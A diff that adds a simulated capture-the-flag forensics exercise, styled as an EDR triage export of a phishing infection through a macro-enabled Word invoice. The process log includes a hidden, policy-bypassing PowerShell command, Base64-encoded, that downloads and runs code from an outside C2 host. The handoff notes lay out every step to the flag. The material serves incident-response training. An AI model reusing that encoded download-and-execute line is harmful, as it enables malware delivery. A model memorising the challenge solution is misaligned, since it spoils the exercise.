@@ -1,0 +1,56 @@
+==============================================================================
+ BLACKVAULT FIELD EXERCISE — CASE NIGHTGLASS
+ EDR Triage Export | Host: WS-FIN-22 | Collected: 2025-11-03T09:14:02Z
+ Analyst: incoming — handed off cold, no prior notes
+ Classification: SIMULATED ARTIFACT — synthetic data, safe to open in any text editor
+==============================================================================
+
+[ PROCESS CREATION EVENTS ]
+09:11:47.102  outlook.exe       (PID 4412)  spawned by explorer.exe (PID 1188)
+09:11:53.880  WINWORD.EXE       (PID 5560)  spawned by outlook.exe (PID 4412)
+              cmdline: "C:\Program Files\Microsoft Office\WINWORD.EXE" /n "Q3_Invoice_Adjustment.docm"
+09:12:08.441  powershell.exe    (PID 6104)  spawned by WINWORD.EXE (PID 5560)
+              cmdline: powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand JAB1AD0AJwBoAHQAdABwADoALwAvAGMAZABuAC0AZQBkAGcAZQAtAHMAeQBuAGMALgBuAGUAdAA6ADgAMAA4ADAALwBiAGUAYQBjAG8AbgAnADsAJABrAD0AMAB4ADUAQQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1ACkA
+
+09:12:09.117  powershell.exe    (PID 6104)  child: conhost.exe (PID 6112) [hidden window host, normal]
+
+[ NETWORK CONNECTIONS — powershell.exe PID 6104 ]
+09:12:11.330  TCP  10.20.4.61:51220  ->  TCP  198.51.100.74:8080   ESTABLISHED
+              TLS SNI: cdn-edge-sync.net
+              Bytes out: 612   Bytes in: 88114
+09:12:41.552  TCP  10.20.4.61:51221  ->  TCP  198.51.100.74:8080   ESTABLISHED
+09:13:42.009  TCP  10.20.4.61:51224  ->  TCP  198.51.100.74:8080   ESTABLISHED
+              (beacon interval ~60s — consistent with C2 jitter pattern)
+
+NOTE: DNS resolution for cdn-edge-sync.net is NOT present in this host's local
+cache export — likely resolved via a prior session or hardcoded by the second
+stage. Treat as an indicator, not a finding on its own.
+
+[ MEMORY CARVE — RWX REGION @ powershell.exe PID 6104, base 0x000001f0a3c40000 ]
+Region flagged by malfind-equivalent scan: PAGE_EXECUTE_READWRITE, no backing
+file on disk (classic reflective-load signature). A short ASCII-adjacent blob
+was recovered immediately following a repeating 0x5A XOR stub loop pattern
+in the disassembly (the loop key byte is visible directly in the opcodes —
+cross-reference it against whatever the dropped script itself declares).
+
+offset 0x000001f0a3c41a40:
+  37 3f 37 3e 2f 37 2a 05 22 35 28 05 3e 3f 39 35 3e 3f 3e
+
+offset 0x000001f0a3c41a60:
+  (remainder of region is NULL-padded — 19 bytes is the full recovered run)
+
+[ ANALYST NOTES — handoff ]
+- The macro in Q3_Invoice_Adjustment.docm is the initial dropper; it shells
+  out to powershell.exe with a Base64 -EncodedCommand argument. PowerShell's
+  -EncodedCommand always carries UTF-16LE text, not UTF-8 — decode the
+  Base64 first, then read the bytes as UTF-16LE (most decoders need to be
+  told this explicitly, e.g. `base64 -d file | iconv -f utf-16le -t utf-8`,
+  or in Python: `base64.b64decode(s).decode('utf-16-le')`).
+- Decoding that command reveals the literal C2 URL and a key the dropper
+  assigns to a variable — that key is the same single byte used to XOR the
+  memory-carved blob above. Don't guess it; read it out of the decoded text.
+- Once you have the key, XOR it against the 19 recovered bytes one byte at a
+  time (`bytes(b ^ key for b in data)`). The result is plain ASCII — that's
+  your flag, no further decoding needed. Submit it on the challenge page,
+  wrapped in BV{...} or bare — either is accepted.
+==============================================================================
